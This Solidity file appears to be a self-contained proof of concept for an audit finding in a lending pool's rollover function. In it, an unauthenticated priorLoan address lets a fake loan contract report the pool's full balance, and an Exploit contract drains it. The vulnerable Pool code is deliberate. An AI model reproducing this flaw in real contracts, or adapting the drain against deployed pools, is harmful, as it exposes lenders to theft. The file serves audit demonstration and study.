// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* OpenTrade Pool.initiateRollover — priorLoan is not authenticated (OtterSec, AuditVault 47890).
   SYNTHETIC, cheatcode-free. calculateRollover reads principal and interest from whatever
   address the pool controller passes. A controller-supplied contract reports the whole
   pool balance, and that amount is pushed to the controller's new loan. */

contract Cash {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

interface ILoan {
    function principal() external view returns (uint256);
    function interest() external view returns (uint256);
}

contract HonestLoan is ILoan {
    function principal() external pure returns (uint256) {
        return 100 ether;
    }

    function interest() external pure returns (uint256) {
        return 10 ether;
    }
}

contract FakeLoan is ILoan {
    Cash public token;
    address public pool;

    constructor(Cash _token, address _pool) {
        token = _token;
        pool = _pool;
    }

    function principal() external view returns (uint256) {
        return token.balanceOf(pool);
    }

    function interest() external pure returns (uint256) {
        return 0;
    }
}

contract Pool {
    Cash public liquidity;
    address public controller;
    address public activeLoan;
    uint256 public assetsMoved;

    constructor(Cash _liquidity, address _controller, address _activeLoan) {
        liquidity = _liquidity;
        controller = _controller;
        activeLoan = _activeLoan;
    }

    modifier onlyPoolController() {
        require(msg.sender == controller, "controller");
        _;
    }

    function initiateRollover(address loan, address priorLoan) external onlyPoolController {
        uint256 assetsFromPriorToNextLoan;
        (assetsFromPriorToNextLoan) = calculateRollover(priorLoan); // @> VULN: priorLoan is not required to be the active loan

        liquidity.transfer(loan, assetsFromPriorToNextLoan);
        assetsMoved = assetsFromPriorToNextLoan;
    }

    function calculateRollover(address priorLoan) public view returns (uint256 assetsFromPriorToNextLoan) {
        assetsFromPriorToNextLoan = ILoan(priorLoan).principal() + ILoan(priorLoan).interest();
    }
}

contract Exploit {
    Cash public token; // nonce 1
    HonestLoan public honest; // nonce 2
    Pool public pool; // nonce 3
    FakeLoan public fake; // nonce 4
    address public constant ADMIN_LOAN = address(uint160(0xA0));
    uint256 public stolen;

    constructor() {
        token = new Cash();
        honest = new HonestLoan();
        pool = new Pool(token, address(this), address(honest));
        fake = new FakeLoan(token, address(pool));
        token.mint(address(pool), 1000 ether);
    }

    function run() external {
        uint256 honestAmount = pool.calculateRollover(address(honest));
        require(honestAmount == 110 ether, "honest rollover");
        pool.initiateRollover(ADMIN_LOAN, address(fake));
        stolen = token.balanceOf(ADMIN_LOAN);
        require(stolen == 1000 ether, "pool not drained");
        require(token.balanceOf(address(pool)) == 0, "lenders left with funds");
        require(stolen - honestAmount == 890 ether, "excess over the real loan");
    }
}
